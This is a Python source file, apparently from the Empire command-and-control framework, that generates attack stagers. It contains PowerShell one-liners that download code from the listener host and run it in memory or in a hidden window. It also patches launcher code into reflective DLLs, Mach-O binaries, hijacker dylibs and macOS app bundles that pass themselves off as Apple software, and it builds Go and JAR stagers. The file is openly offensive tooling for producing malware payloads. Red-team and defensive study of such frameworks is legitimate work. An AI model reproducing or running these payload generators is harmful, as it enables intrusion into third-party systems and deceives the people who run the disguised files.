import base64
import errno
import logging
import os
import shutil
import typing
from itertools import cycle
from pathlib import Path

try:
    import donut
except ModuleNotFoundError:
    donut = None

import macholib.MachO

from empire.server.common import helpers
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util

if typing.TYPE_CHECKING:
    from empire.server.common.empire import MainMenu

log = logging.getLogger(__name__)


class StagerGenerationService:
    def __init__(self, main_menu: "MainMenu"):
        self.main_menu = main_menu
        self.listener_service = main_menu.listenersv2
        self.agent_service = main_menu.agentsv2
        self.plugin_service = main_menu.pluginsv2
        self.agent_communication_service = main_menu.agentcommsv2
        self.agent_task_service = main_menu.agenttasksv2
        self.obfuscation_service = main_menu.obfuscationv2
        self.dotnet_compiler = main_menu.dotnet_compiler

    def generate_launcher_fetcher(
        self,
        encode=True,
        web_file="http://127.0.0.1/launcher.bat",
        launcher="powershell -noP -sta -w 1 -enc ",
    ):
        stager = (
            'wget "'
            + web_file
            + r'" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
        )
        if encode:
            return helpers.powershell_launcher(stager, launcher)

        return stager

    def generate_launcher(  # noqa: PLR0913
        self,
        listener_name,
        language=None,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        stager_retries="0",
        safe_checks="true",
        bypasses: str = "",
    ):
        """
        Abstracted functionality that invokes the generate_launcher() method for a given listener,
        if it exists.
        """
        with SessionLocal.begin() as db:
            bypasses_parsed = []
            for bypass in bypasses.split(" "):
                db_bypass = (
                    db.query(models.Bypass).filter(models.Bypass.name == bypass).first()
                )
                if db_bypass:
                    if db_bypass.language == language:
                        bypasses_parsed.append(db_bypass.code)
                    else:
                        log.warning(f"Invalid bypass language: {db_bypass.language}")

            db_listener = self.listener_service.get_by_name(db, listener_name)
            active_listener = self.listener_service.get_active_listener(db_listener.id)
            if not active_listener:
                log.error(f"Invalid listener: {listener_name}")
                return ""

            launcher_code = active_listener.generate_launcher(
                encode=encode,
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                language=language,
                listener_name=listener_name,
                safe_checks=safe_checks,
                bypasses=bypasses_parsed,
            )
            if launcher_code:
                return launcher_code
            return None

    def generate_dll(self, posh_code, arch):
        """
        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
        """

        # read in original DLL and patch the bytes based on arch
        if arch.lower() == "x86":
            origPath = (
                f"{self.main_menu.installPath}/data/misc/ReflectivePick_x86_orig.dll"
            )
        else:
            origPath = (
                f"{self.main_menu.installPath}/data/misc/ReflectivePick_x64_orig.dll"
            )

        if os.path.isfile(origPath):
            dllRaw = ""
            with open(origPath, "rb") as f:
                dllRaw = f.read()

                replacementCode = helpers.decode_base64(posh_code)

                # patch the dll with the new PowerShell code
                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                index = dllRaw.find(searchString)
                return (
                    dllRaw[:index]
                    + replacementCode
                    + dllRaw[(index + len(replacementCode)) :]
                )

        else:
            log.error(f"Original .dll for arch {arch} does not exist!")
            return None

    def generate_powershell_exe(
        self, posh_code, dot_net_version="net40", obfuscate=False
    ) -> Path:
        """
        Generate powershell launcher embedded in csharp
        """
        with open(self.main_menu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
            stager_yaml = f.read()
        stager_yaml = stager_yaml.decode("UTF-8")

        # Write text file to resources to be embedded
        with open(
            self.dotnet_compiler.compiler_dir / "Data/EmbeddedResources/launcher.txt",
            "w",
        ) as f:
            f.write(posh_code)

        return self.dotnet_compiler.compile_stager(
            stager_yaml, "CSharpPS", dot_net_version=dot_net_version, confuse=obfuscate
        )

    def generate_powershell_shellcode(
        self, posh_code, arch="both", dot_net_version="net40"
    ) -> tuple[str | None, str | None]:
        """
        Generate powershell shellcode using donut python module
        """
        if arch == "x86":
            arch_type = 1
        elif arch == "x64":
            arch_type = 2
        elif arch == "both":
            arch_type = 3

        directory = self.generate_powershell_exe(posh_code, dot_net_version)

        if not donut:
            err = "module donut-shellcode not installed. It is only supported on x86."
            log.warning(err, exc_info=True)
            return None, err

        shellcode = donut.create(file=str(directory), arch=arch_type)
        return shellcode, None

    def generate_exe_oneliner(
        self, language, obfuscate, obfuscation_command, encode, listener_name
    ):
        """
        Generate an oneliner for an executable
        """
        listener = self.listener_service.get_active_listener_by_name(listener_name)

        if getattr(listener, "parent_listener", None) is not None:
            hop = listener.options["Name"]["Value"]
            while getattr(listener, "parent_listener", None) is not None:
                listener = self.listener_service.get_active_listener_by_name(
                    listener.parent_listener_name
                )
        else:
            hop = ""
        launcher_front = listener.options["Launcher"]["Value"]

        launcher = f"""
        $wc=New-Object System.Net.WebClient;
        $bytes=$wc.DownloadData("{listener.host_address}download/{language}/{hop}");
        $assembly=[Reflection.Assembly]::load($bytes);
        $assembly.EntryPoint.Invoke($null,$null);
        """

        launcher = helpers.strip_powershell_comments(launcher)
        launcher = data_util.ps_convert_to_oneliner(launcher)

        if obfuscate:
            launcher = self.obfuscation_service.obfuscate(
                launcher,
                obfuscation_command=obfuscation_command,
            )
        if encode and (
            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
        ):
            return helpers.powershell_launcher(launcher, launcher_front)
        return launcher

    def generate_go_exe_oneliner(
        self,
        language,
        listener_name,
        obfuscate,
        obfuscation_command,
        encode,
    ):
        """
        Generate a oneliner for a executable
        """
        listener = self.listener_service.get_active_listener_by_name(listener_name)

        if getattr(listener, "parent_listener", None) is not None:
            hop = listener.options["Name"]["Value"]
            while getattr(listener, "parent_listener", None) is not None:
                listener = self.listener_service.get_active_listener_by_name(
                    listener.parent_listener.name
                )
        else:
            hop = ""
        launcher_front = listener.options["Launcher"]["Value"]

        launcher = f"""
            # Create a temp file path
            $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
            $wc = New-Object System.Net.WebClient;
            $url = "{listener.host_address}download/{language}/{hop}";
            $wc.DownloadFile($url, $tempFilePath);
            Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
        """

        launcher = helpers.strip_powershell_comments(launcher)
        launcher = data_util.ps_convert_to_oneliner(launcher)

        if obfuscate:
            launcher = self.obfuscation_service.obfuscate(
                launcher,
                obfuscation_command=obfuscation_command,
            )

        if encode and (
            (not obfuscate) or ("launcher" not in obfuscation_command.lower())
        ):
            return helpers.powershell_launcher(launcher, launcher_front)

        return launcher

    def generate_python_exe(
        self, python_code, dot_net_version="net40", obfuscate=False
    ) -> Path:
        """
        Generate ironpython launcher embedded in csharp
        """
        with open(self.main_menu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
            stager_yaml = f.read()
        stager_yaml = stager_yaml.decode("UTF-8")

        # Write text file to resources to be embedded
        # This file is problematic because multiple runs
        # can overwrite the file and cause issues.
        with open(
            self.dotnet_compiler.compiler_dir / "Data/EmbeddedResources/launcher.txt",
            "w",
        ) as f:
            f.write(python_code)

        return self.dotnet_compiler.compile_stager(
            stager_yaml, "CSharpPy", dot_net_version=dot_net_version, confuse=obfuscate
        )

    def generate_python_shellcode(
        self, posh_code, arch="both", dot_net_version="net40"
    ) -> tuple[str | None, str | None]:
        """
        Generate ironpython shellcode using donut python module
        """
        if arch == "x86":
            arch_type = 1
        elif arch == "x64":
            arch_type = 2
        elif arch == "both":
            arch_type = 3

        if not donut:
            err = "module donut-shellcode not installed. It is only supported on x86."
            log.warning(err, exc_info=True)
            return None, err

        directory = self.generate_python_exe(posh_code, dot_net_version)
        shellcode = donut.create(file=str(directory), arch=arch_type)
        return shellcode, None

    def generate_macho(self, launcher_code):
        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code.
        """

        MH_EXECUTE = 2
        # with open(self.installPath + "/data/misc/machotemplate", 'rb') as f:
        with open(f"{self.main_menu.installPath}/data/misc/machotemplate", "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_EXECUTE:
                log.error("Macho binary template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            for cmd in cmds:
                count = 0
                if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset) + (
                                    int(section.size) - 2119
                                )
                                placeHolderSz = int(section.size) - (
                                    int(section.size) - 2119
                                )

            template = f.read()

        if placeHolderSz and offset:
            key = "subF"
            launcher_code = "".join(
                chr(ord(x) ^ ord(y)) for (x, y) in zip(launcher_code, cycle(key))
            )
            launcher_code = base64.urlsafe_b64encode(launcher_code.encode("utf-8"))
            launcher = launcher_code + b"\x00" * (placeHolderSz - len(launcher_code))
            return template[:offset] + launcher + template[(offset + len(launcher)) :]

        log.error("Unable to patch MachO binary")
        return None

    def generate_dylib(self, launcher_code, arch, hijacker):  # noqa: PLR0912
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        MH_DYLIB = 6
        if hijacker.lower() == "true":
            if arch == "x86":
                f = f"{self.main_menu.installPath}/data/misc/hijackers/template.dylib"
            else:
                f = f"{self.main_menu.installPath}/data/misc/hijackers/template64.dylib"
        elif arch == "x86":
            f = f"{self.main_menu.installPath}/data/misc/templateLauncher.dylib"
        else:
            f = f"{self.main_menu.installPath}/data/misc/templateLauncher64.dylib"

        with open(f, "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_DYLIB:
                log.error("Dylib template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            placeHolderSz = None
            offset = None

            for cmd in cmds:
                count = 0
                if (
                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
                ):
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            log.debug(
                                f"Checking section: {section.sectname.strip(b'\\x00')}"
                            )
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset)
                                placeHolderSz = int(section.size) - 52
                                log.debug(
                                    f"Found offset: {offset}, placeHolderSz: {placeHolderSz}"
                                )
            template = f.read()

        if placeHolderSz is not None and offset is not None:
            launcher = launcher_code + "\x00" * (placeHolderSz - len(launcher_code))
            if isinstance(launcher, str):
                launcher = launcher.encode("UTF-8")
            return b"".join(
                [template[:offset], launcher, template[(offset + len(launcher)) :]]
            )

        log.error("Unable to patch dylib")
        return None

    def generate_appbundle(  # noqa: PLR0915, PLR0912
        self, launcher_code, arch, icon, app_name, disarm
    ):
        """
        Generates an application. The embedded executable is a macho binary with the python interpreter.
        """
        MH_EXECUTE = 2

        if arch == "x64":
            f = (
                self.main_menu.installPath
                + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher"
            )
            directory = (
                self.main_menu.installPath
                + "/data/misc/apptemplateResources/x64/launcher.app/"
            )
        else:
            f = (
                self.main_menu.installPath
                + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher"
            )
            directory = (
                self.main_menu.installPath
                + "/data/misc/apptemplateResources/x86/launcher.app/"
            )

        with open(f, "rb") as f:
            macho = macholib.MachO.MachO(f.name)

            if int(macho.headers[0].header.filetype) != MH_EXECUTE:
                log.error("Macho binary template is not the correct filetype")
                return ""

            cmds = macho.headers[0].commands

            for cmd in cmds:
                count = 0
                if (
                    int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64
                    or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT
                ):
                    count += 1
                    if (
                        cmd[count].segname.strip(b"\x00") == b"__TEXT"
                        and cmd[count].nsects > 0
                    ):
                        count += 1
                        for section in cmd[count]:
                            if section.sectname.strip(b"\x00") == b"__cstring":
                                offset = int(section.offset)
                                placeHolderSz = int(section.size) - 52

            template = f.read()

        if placeHolderSz and offset:
            launcher = launcher_code.encode("utf-8") + b"\x00" * (
                placeHolderSz - len(launcher_code)
            )
            patched_binary = (
                template[:offset] + launcher + template[(offset + len(launcher)) :]
            )
            if app_name == "":
                app_name = "launcher"

            tmpdir = f"/tmp/application/{app_name}.app/"
            shutil.copytree(directory, tmpdir)
            with open(tmpdir + "Contents/MacOS/launcher", "wb") as f:
                if disarm is not True:
                    f.write(patched_binary)
                else:
                    t = (
                        self.main_menu.installPath
                        + "/data/misc/apptemplateResources/empty/macho"
                    )
                    with open(t, "rb") as t:
                        w = t.read()
                        f.write(w)

            os.rename(
                tmpdir + "Contents/MacOS/launcher",
                tmpdir + f"Contents/MacOS/{app_name}",
            )
            os.chmod(tmpdir + f"Contents/MacOS/{app_name}", 0o755)

            if icon != "":
                iconfile = os.path.splitext(icon)[0].split("/")[-1]
                shutil.copy2(icon, tmpdir + "Contents/Resources/" + iconfile + ".icns")
            else:
                iconfile = icon
            appPlist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>BuildMachineOSBuild</key>
    <string>15G31</string>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>{app_name}</string>
    <key>CFBundleIconFile</key>
    <string>{iconfile}</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.{app_name}</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>{app_name}</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleSignature</key>
    <string>????</string>
    <key>CFBundleSupportedPlatforms</key>
    <array>
        <string>MacOSX</string>
    </array>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>DTCompiler</key>
    <string>com.apple.compilers.llvm.clang.1_0</string>
    <key>DTPlatformBuild</key>
    <string>7D1014</string>
    <key>DTPlatformVersion</key>
    <string>GM</string>
    <key>DTSDKBuild</key>
    <string>15E60</string>
    <key>DTSDKName</key>
    <string>macosx10.11</string>
    <key>DTXcode</key>
    <string>0731</string>
    <key>DTXcodeBuild</key>
    <string>7D1014</string>
    <key>LSApplicationCategoryType</key>
    <string>public.app-category.utilities</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.11</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSHumanReadableCopyright</key>
    <string>Copyright 2016 Apple. All rights reserved.</string>
    <key>NSMainNibFile</key>
    <string>MainMenu</string>
    <key>NSPrincipalClass</key>
    <string>NSApplication</string>
</dict>
</plist>
"""
            with open(tmpdir + "Contents/Info.plist", "w") as f:
                f.write(appPlist)

            shutil.make_archive("/tmp/launcher", "zip", "/tmp/application")
            shutil.rmtree("/tmp/application")

            with open("/tmp/launcher.zip", "rb") as f:
                zipbundle = f.read()
            os.remove("/tmp/launcher.zip")
            return zipbundle

        log.error("Unable to patch application")
        return None

    def generate_jar(self, launcher_code):
        with open(self.main_menu.installPath + "/data/misc/Run.java") as f:
            javacode = f.read()
        javacode = javacode.replace("LAUNCHER", launcher_code)
        jarpath = self.main_menu.installPath + "/data/misc/classes/com/installer/apple/"
        try:
            os.makedirs(jarpath)
        except OSError as e:
            if e.errno != errno.EEXIST:
                raise

        with open(jarpath + "Run.java", "w") as f:
            f.write(javacode)
        os.system(
            "javac "
            + self.main_menu.installPath
            + "/data/misc/classes/com/installer/apple/Run.java"
        )
        os.system(
            "jar -cfe "
            + self.main_menu.installPath
            + "/data/misc/Run.jar com.installer.apple.Run "
            + self.main_menu.installPath
            + "/data/misc/classes/com/installer/apple/Run.class"
        )
        os.remove(
            self.main_menu.installPath
            + "/data/misc/classes/com/installer/apple/Run.class"
        )
        os.remove(
            self.main_menu.installPath
            + "/data/misc/classes/com/installer/apple/Run.java"
        )
        with open(self.main_menu.installPath + "/data/misc/Run.jar", "rb") as jarfile:
            jar = jarfile.read()
        os.remove(self.main_menu.installPath + "/data/misc/Run.jar")

        return jar

    def generate_upload(self, file, path):
        script = """
$b64 = "BASE64_BLOB_GOES_HERE"
$filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
[IO.FILE]::WriteAllBytes($filename, [Convert]::FromBase64String($b64))

"""

        file_encoded = base64.b64encode(file).decode("UTF-8")

        script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
        return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)

    def generate_python_stageless(self, active_listener, language):
        if language == "ironpython":
            language = "python"
            version = "ironpython"
        else:
            version = ""

        agent_code = active_listener.generate_agent(
            active_listener.options, language=language, version=version
        )

        comms_code = active_listener.generate_comms(
            active_listener.options, language=language
        )

        stager_code = (
            active_listener.generate_stager(
                active_listener.options, language=language, encrypt=False, encode=False
            )
            .replace("exec(agent_code, globals())", "")
            .replace(
                "stage = Stage()",
                f"stage = Stage()\nserver='{active_listener.host_address}'",
            )
        )

        if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
            full_agent = "\n".join([agent_code, stager_code, comms_code])
        else:
            full_agent = "\n".join([agent_code, stager_code])
        return full_agent

    def generate_powershell_stageless(self, active_listener, language):
        agent_code = active_listener.generate_agent(
            active_listener.options, language=language
        )

        comms_code = active_listener.generate_comms(
            active_listener.options, language=language
        )

        stager_code = (
            active_listener.generate_stager(
                active_listener.options, language=language, encrypt=False, encode=False
            )
            .replace("IEX ($e.GetString($agentBytes))", "")
            .replace('Start-Negotiate -s "$ser"', 'Start-Negotiate -s "$Script:server"')
        )

        if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
            full_agent = "\n".join([agent_code, stager_code, comms_code])
        else:
            full_agent = "\n".join([agent_code, stager_code])

        return full_agent

    def generate_stageless(self, options):
        listener_name = options["Listener"]["Value"]
        language = options["Language"]["Value"].lower()

        active_listener = self.listener_service.get_active_listener_by_name(
            listener_name
        )

        if language.lower() in ["python", "ironpython"]:
            return self.generate_python_stageless(active_listener, language)

        if language.lower() == "powershell":
            return self.generate_powershell_stageless(active_listener, language)

        return None

    def generate_go_stageless(self, options, listener_name=None):
        if not listener_name:
            listener_name = options["Listener"]["Value"]

        active_listener = self.listener_service.get_active_listener_by_name(
            listener_name
        )

        session_id = "00000000"
        staging_key = active_listener.options["StagingKey"]["Value"]
        delay = active_listener.options["DefaultDelay"]["Value"]
        jitter = active_listener.options["DefaultJitter"]["Value"]
        profile = active_listener.options["DefaultProfile"]["Value"]
        kill_date = active_listener.options["KillDate"]["Value"]
        working_hours = active_listener.options["WorkingHours"]["Value"]
        lost_limit = active_listener.options["DefaultLostLimit"]["Value"]

        template_vars = {
            "PROFILE": profile,
            "HOST": active_listener.host_address,
            "SESSION_ID": session_id,
            "KILL_DATE": kill_date,
            "WORKING_HOURS": working_hours,
            "DELAY": delay,
            "JITTER": jitter,
            "LOST_LIMIT": lost_limit,
            "STAGING_KEY": base64.b64encode(staging_key.encode("UTF-8")).decode(
                "UTF-8"
            ),
            "DEFAULT_RESPONSE": base64.b64encode(
                active_listener.default_response().encode("UTF-8")
            ).decode("UTF-8"),
            "AGENT_PRIVATE_CERT_KEY": base64.b64encode(
                active_listener.agent_private_cert_key
            ).decode("UTF-8"),
            "AGENT_PUBLIC_CERT_KEY": base64.b64encode(
                active_listener.agent_public_cert_key
            ).decode("UTF-8"),
            "SERVER_PUBLIC_CERT_KEY": base64.b64encode(
                active_listener.server_public_cert_key
            ).decode("UTF-8"),
        }

        return self.main_menu.go_compiler.compile_stager(
            template_vars, "stager", goos="windows", goarch="amd64"
        )
